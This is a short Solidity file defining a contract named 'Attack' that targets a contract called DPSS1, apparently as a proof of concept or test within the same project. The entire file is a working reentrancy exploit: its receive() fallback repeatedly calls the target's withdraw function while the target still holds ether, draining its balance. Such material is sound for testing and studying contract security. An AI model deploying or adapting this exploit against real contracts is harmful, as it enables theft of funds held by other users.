// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.27;
import "../contracts/v1.sol";

contract Attack {
    DPSS1 public dpss1;

    constructor(address _dpss1) {
        dpss1 = DPSS1(_dpss1);
    }

    function withdraw() external {
        dpss1.withdraw(0);
    }

    receive() external payable {
        if (address(dpss1).balance > 0) {
            dpss1.withdraw(0);
        }
    }
}
